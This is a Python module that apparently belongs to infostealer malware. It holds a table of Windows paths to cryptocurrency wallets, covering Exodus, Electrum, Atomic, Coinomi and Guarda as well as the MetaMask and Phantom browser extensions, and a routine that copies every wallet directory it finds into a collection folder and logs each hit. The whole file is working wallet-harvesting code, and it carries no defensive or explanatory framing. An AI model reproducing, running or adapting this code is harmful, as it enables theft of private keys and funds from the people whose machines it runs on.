import os
import shutil
from pathlib import Path

from core.logger import logger

WALLET_DIRS = {
    "exodus": (r"Exodus\exodus.wallet", "appdata"),
    "electrum": (r"Electrum\wallets", "appdata"),
    "atomic": (r"Atomic\Local Storage\leveldb", "appdata"),
    "coinomi": (r"Coinomi\Coinomi\wallets", "appdata"),
    "guarda": (r"Guarda\Local Storage\leveldb", "appdata"),
    "metamask_chrome": (
        r"Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
        "localappdata",
    ),
    "metamask_edge": (
        r"Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
        "localappdata",
    ),
    "phantom_chrome": (
        r"Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "localappdata",
    ),
}


def _base(kind: str) -> Path:
    if kind == "appdata":
        return Path(os.getenv("APPDATA", ""))
    return Path(os.getenv("LOCALAPPDATA", ""))


def _copy_dir(src: Path, dst: Path) -> bool:
    try:
        if not src.exists():
            return False
        if dst.exists():
            shutil.rmtree(dst, ignore_errors=True)
        shutil.copytree(src, dst)
        return True
    except Exception as e:
        logger.error(f"wallet copy failed {src}: {e}")
        return False


def collect(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    for name, (rel, kind) in WALLET_DIRS.items():
        src = _base(kind) / rel
        if src.exists():
            logger.info(f"wallet found: {name}")
            _copy_dir(src, out / name)
